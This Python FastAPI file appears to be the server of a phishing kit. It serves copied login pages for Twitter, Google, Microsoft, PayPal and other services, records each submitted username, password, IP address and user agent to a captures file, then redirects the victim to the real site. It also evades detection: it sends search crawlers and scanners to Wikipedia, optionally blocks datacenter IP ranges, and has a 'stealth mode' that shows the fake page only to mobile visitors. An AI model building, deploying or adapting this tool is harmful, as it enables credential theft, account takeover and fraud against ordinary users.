import uvicorn
from fastapi import FastAPI, Request, BackgroundTasks, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import logging
import json
import os
import argparse
import sys
from datetime import datetime
from core.utils.i18n import i18n, t

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("vantablack.phishing")

app = FastAPI()

# Enable CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Capture file
CAPTURE_FILE = "captures.json"

# Global configuration
TARGET_PLATFORM = "twitter"
STEALTH_MODE = False
GEO_BLOCK = False

# Known Data Center / Bot IP Ranges (Mock prefixes for demonstration)
BLOCKED_IP_PREFIXES = [
    "35.", "34.", "104.", "52.", "54.", "13.", # Google/AWS common ranges
    "40.", "20.", "23." # Microsoft
]

BOT_AGENTS = [
    "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot",
    "Sogou", "Exabot", "facebot", "facebookexternalhit", "ia_archiver",
    "curl", "wget", "python-requests", "scrapy", "bot", "crawler", "spider"
]

def is_bot(user_agent):
    if not user_agent:
        return True
    ua = user_agent.lower()
    for bot in BOT_AGENTS:
        if bot.lower() in ua:
            return True
    return False

def is_datacenter_ip(ip):
    # check against blocked prefixes
    for prefix in BLOCKED_IP_PREFIXES:
        if ip.startswith(prefix):
            return True
    return False

def is_mobile(user_agent):
    if not user_agent:
        return False
    ua = user_agent.lower()
    return "mobile" in ua or "android" in ua or "iphone" in ua or "ipad" in ua

def log_capture(data: dict, ip: str, user_agent: str):
    entry = {
        "timestamp": datetime.now().isoformat(),
        "ip": ip,
        "user_agent": user_agent,
        "data": data,
        "platform": TARGET_PLATFORM
    }
    
    # Append to file
    captures = []
    if os.path.exists(CAPTURE_FILE):
        try:
            with open(CAPTURE_FILE, "r") as f:
                captures = json.load(f)
        except:
            pass
    
    captures.append(entry)
    
    with open(CAPTURE_FILE, "w") as f:
        json.dump(captures, f, indent=2)
        
    print("\n" + "="*50)
    print(t("credentials_captured", ip=ip))
    print(t("platform", platform=TARGET_PLATFORM))
    print(t("data", data=json.dumps(data, indent=2)))
    print("="*50 + "\n")

@app.middleware("http")
async def stealth_middleware(request: Request, call_next):
    user_agent = request.headers.get("user-agent", "")
    client_ip = request.client.host
    
    # Check for known bots
    if is_bot(user_agent):
        print(t("bot_detected", ip=client_ip, agent=user_agent))
        # Redirect bots to Wikipedia
        return RedirectResponse("https://www.wikipedia.org")

    # Check IP Reputation (Datacenter/VPN)
    if GEO_BLOCK and is_datacenter_ip(client_ip):
        print(t("ip_blocked", ip=client_ip))
        return RedirectResponse("https://www.google.com")
        
    # Stealth Mode: Only allow mobile
    if STEALTH_MODE and not is_mobile(user_agent):
        print(t("stealth_mode_active"))
        # Redirect desktop users to the real site to avoid suspicion
        redirect_map = {
            "twitter": "https://twitter.com",
            "x": "https://twitter.com",
            "google": "https://google.com",
            "microsoft": "https://microsoft.com",
            "linkedin": "https://linkedin.com",
            "facebook": "https://facebook.com",
            "instagram": "https://instagram.com",
            "github": "https://github.com",
            "amazon": "https://amazon.com",
            "apple": "https://apple.com",
            "discord": "https://discord.com",
            "dropbox": "https://dropbox.com",
            "paypal": "https://paypal.com",
            "reddit": "https://reddit.com",
            "slack": "https://slack.com",
            "tiktok": "https://tiktok.com",
            "yahoo": "https://yahoo.com"
        }
        target_url = redirect_map.get(TARGET_PLATFORM, "https://google.com")
        return RedirectResponse(target_url)

    response = await call_next(request)
    return response

@app.get("/", response_class=HTMLResponse)
async def root():
    return RedirectResponse(url="/login")

@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    # Determine template path
    template_path = f"core/assets/templates/high_fidelity/{TARGET_PLATFORM}.html"
    
    # Fallback for X/Twitter
    if TARGET_PLATFORM in ["twitter", "x"]:
        if os.path.exists("templates/x_login_v2.html"):
            template_path = "templates/x_login_v2.html"
            
    try:
        if os.path.exists(template_path):
            with open(template_path, "r") as f:
                content = f.read()
            return HTMLResponse(content=content)
        else:
            return HTMLResponse(content=f"<h1>Error: Template for {TARGET_PLATFORM} not found</h1><p>Expected at: {template_path}</p>", status_code=500)
    except Exception as e:
        return HTMLResponse(content=f"<h1>Error loading template: {e}</h1>", status_code=500)

@app.post("/login")
async def login_submit(request: Request, background_tasks: BackgroundTasks):
    try:
        data = await request.json()
    except:
        try:
            form = await request.form()
            data = dict(form)
        except:
            data = {}
    
    ip = request.client.host
    user_agent = request.headers.get("user-agent", "unknown")
    
    background_tasks.add_task(log_capture, data, ip, user_agent)
    
    # Redirect to real site
    redirect_map = {
        "twitter": "https://twitter.com/home",
        "x": "https://twitter.com/home",
        "google": "https://accounts.google.com/",
        "microsoft": "https://login.microsoftonline.com/",
        "linkedin": "https://www.linkedin.com/",
        "facebook": "https://www.facebook.com/",
        "instagram": "https://www.instagram.com/",
        "github": "https://github.com/",
        "amazon": "https://www.amazon.com/",
        "apple": "https://www.icloud.com/",
        "discord": "https://discord.com/login",
        "dropbox": "https://www.dropbox.com/login",
        "paypal": "https://www.paypal.com/signin",
        "reddit": "https://www.reddit.com/login/",
        "slack": "https://slack.com/signin",
        "tiktok": "https://www.tiktok.com/login",
        "yahoo": "https://login.yahoo.com/"
    }
    
    target_url = redirect_map.get(TARGET_PLATFORM, "https://google.com")
    return RedirectResponse(url=target_url, status_code=302)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="twitter", help="Target platform (e.g. twitter, google, microsoft)")
    parser.add_argument("--port", type=int, default=8080, help="Port to run server on")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode")
    parser.add_argument("--geo", action="store_true", help="Enable Geo-Fencing (Simulated)")
    parser.add_argument("--lang", default="en", help="Language for logs")
    
    # Parse known args only to avoid conflict with uvicorn
    args, unknown = parser.parse_known_args()
    
    TARGET_PLATFORM = args.target.lower()
    STEALTH_MODE = args.stealth
    GEO_BLOCK = args.geo
    
    i18n.set_language(args.lang)

    if GEO_BLOCK:
        print(t("geo_active"))

    print(t("starting_server", target=TARGET_PLATFORM))
    if STEALTH_MODE:
        print(t("stealth_mode_active"))
    
    uvicorn.run(app, host="0.0.0.0", port=args.port, log_level="info")
